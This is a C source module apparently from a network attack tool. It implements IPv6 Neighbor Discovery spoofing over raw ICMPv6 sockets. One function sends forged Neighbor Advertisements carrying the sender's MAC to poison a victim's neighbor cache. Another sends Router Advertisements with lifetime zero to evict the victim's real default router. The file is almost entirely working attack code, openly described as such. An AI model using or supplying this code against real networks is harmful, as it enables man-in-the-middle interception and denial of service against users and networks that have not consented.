/* IPv6 NDP spoofing using raw sockets.
 *
 * Sends spoofed Neighbor Advertisements to poison a victim's neighbor cache,
 * and (optionally) Router Advertisements with lifetime 0 to evict the real router.
 *
 * NOTE: macOS requires root + IP_HDRINCL alternative for v6 = IPV6_PKTINFO with
 *       a raw ICMPv6 socket and a manually-built ICMPv6 header. The kernel
 *       computes the ICMPv6 checksum when IPV6_CHECKSUM is set.
 */

#include "wm_ndp.h"

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>

typedef struct {
    int  fd;
    int  ifindex;
    char iface[IFNAMSIZ];
} ndp_ctx_t;

void *wm_ndp_open(const char *iface, char *errbuf) {
    int fd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    if (fd < 0) { snprintf(errbuf, 256, "socket: %s", strerror(errno)); return NULL; }

    int hops = 255;
    setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS,   &hops, sizeof(hops));
    setsockopt(fd, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &hops, sizeof(hops));

    int offset = 2;        // checksum offset for ICMPv6
    setsockopt(fd, IPPROTO_IPV6, IPV6_CHECKSUM, &offset, sizeof(offset));

    unsigned int ifindex = if_nametoindex(iface);
    if (ifindex == 0) {
        snprintf(errbuf, 256, "if_nametoindex(%s): %s", iface, strerror(errno));
        close(fd); return NULL;
    }
    setsockopt(fd, IPPROTO_IPV6, IPV6_MULTICAST_IF, &ifindex, sizeof(ifindex));

    ndp_ctx_t *ctx = (ndp_ctx_t *)calloc(1, sizeof(ndp_ctx_t));
    ctx->fd = fd;
    ctx->ifindex = (int)ifindex;
    strncpy(ctx->iface, iface, IFNAMSIZ - 1);
    return ctx;
}

void wm_ndp_close(void *handle) {
    ndp_ctx_t *ctx = (ndp_ctx_t *)handle;
    if (!ctx) return;
    if (ctx->fd >= 0) close(ctx->fd);
    free(ctx);
}

/* Neighbor Advertisement payload + Target Link-Layer Address option.
 * RFC 4861 §4.4. Flags: solicited(0x40000000) + override(0x20000000).
 */
int wm_ndp_send_spoof(void *handle,
                      const uint8_t our_mac[6],
                      const char   *our_ipv6_ll,
                      const char   *victim_ipv6,
                      const char   *target_ipv6) {
    ndp_ctx_t *ctx = (ndp_ctx_t *)handle;
    if (!ctx) return -1;

    struct in6_addr target;
    if (inet_pton(AF_INET6, target_ipv6, &target) != 1) return -1;

    uint8_t pkt[32];
    memset(pkt, 0, sizeof(pkt));
    pkt[0] = 136;                 // type: NA
    pkt[1] = 0;                   // code
    /* checksum [2..3] -> filled by kernel */
    pkt[4] = 0x60;                // flags: Solicited + Override (no Router bit)
    /* reserved [5..7] = 0 */
    memcpy(pkt + 8, &target, 16); // target address

    /* Target Link-Layer Address option (type 2, length 1 = 8 bytes) */
    pkt[24] = 2;
    pkt[25] = 1;
    memcpy(pkt + 26, our_mac, 6);

    struct sockaddr_in6 dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin6_family = AF_INET6;
    if (inet_pton(AF_INET6, victim_ipv6, &dst.sin6_addr) != 1) return -1;
    dst.sin6_scope_id = ctx->ifindex;

    ssize_t n = sendto(ctx->fd, pkt, sizeof(pkt), 0,
                       (struct sockaddr *)&dst, sizeof(dst));
    return n > 0 ? 0 : -1;
}

/* Router Advertisement with router lifetime 0 — evicts default router. */
int wm_ndp_send_ra_kill(void *handle,
                        const uint8_t our_mac[6],
                        const char   *our_ipv6_ll,
                        const char   *victim_ipv6) {
    ndp_ctx_t *ctx = (ndp_ctx_t *)handle;
    if (!ctx) return -1;

    uint8_t pkt[24];
    memset(pkt, 0, sizeof(pkt));
    pkt[0] = 134;                  // type: RA
    pkt[1] = 0;                    // code
    /* checksum [2..3] kernel-filled */
    pkt[4] = 64;                   // cur hop limit
    pkt[5] = 0;                    // M/O flags = 0
    pkt[6] = 0; pkt[7] = 0;        // Router Lifetime = 0  ← the kill switch
    /* reachable time [8..11] = 0 */
    /* retrans timer  [12..15] = 0 */

    /* Source Link-Layer Address option */
    pkt[16] = 1;
    pkt[17] = 1;
    memcpy(pkt + 18, our_mac, 6);

    struct sockaddr_in6 dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin6_family = AF_INET6;
    if (inet_pton(AF_INET6, victim_ipv6, &dst.sin6_addr) != 1) return -1;
    dst.sin6_scope_id = ctx->ifindex;

    ssize_t n = sendto(ctx->fd, pkt, sizeof(pkt), 0,
                       (struct sockaddr *)&dst, sizeof(dst));
    return n > 0 ? 0 : -1;
}
